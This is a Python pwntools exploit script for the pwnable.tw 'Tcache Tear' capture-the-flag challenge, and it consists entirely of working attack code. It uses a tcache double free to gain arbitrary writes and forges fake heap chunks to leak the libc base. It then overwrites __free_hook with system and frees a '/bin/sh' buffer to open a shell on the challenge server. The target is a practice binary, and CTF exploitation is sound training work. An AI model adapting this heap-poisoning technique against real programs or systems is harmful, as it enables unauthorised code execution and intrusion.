#Exploit for pwnable.tw/Tcache Tear
from pwn import *

target = process('./tcache_tear', env={"LD_PRELOAD":"./libc.so.6"})
target = remote('chall.pwnable.tw', 10207)
elf = ELF('./tcache_tear')
libc = ELF('./libc.so.6')
#context.log_level = "DEBUG"

gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
name = 0x00602060
ptr  = 0x00602088

def sa(s, d):
	target.sendafter(s, d)

def sla(s, d):
	target.sendlineafter(s, d)

def malloc(size, data):
	sla(":", "1")
	sla(":", str(size))
	sa(":", data)

def free():
	sla(":", "2")

def info():
	sla(":", "3")

def arb_write(addr, size, data):
	malloc(size, "A")
	free()
	free()
	malloc(size, p64(addr))
	malloc(size, "JUNK")
	malloc(size, data)
############################################################################################################
sa(":", "NOTHING")

fake1 = p64(0) + p64(0x21) + p64(0)*2 + p64(0) + p64(0x21)
arb_write(name + 0x500, 0x50, fake1)
#gdb.attach(target, 'x/40wx ' + hex(name+0x500))

fake2 = p64(0) + p64(0x501) + p64(0)*3 + p64(name + 0x10)
arb_write(name, 0x60, fake2)
#gdb.attach(target, 'x/40wx ' + hex(name))
free()
info()
target.recvuntil(":")
#target.interactive()
target.recv(0x10)
malloc_hook = u64(target.recv(8)) - (0xa0 - 0x30)
libc_base = malloc_hook - libc.sym['__malloc_hook']
log.info("LIBC Base: " + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']

arb_write(free_hook, 0x70, p64(libc_base + libc.sym['system']))

malloc(0x20, "/bin/sh\x00")
#target.sendline("1\n1337\n")
free()

target.interactive()
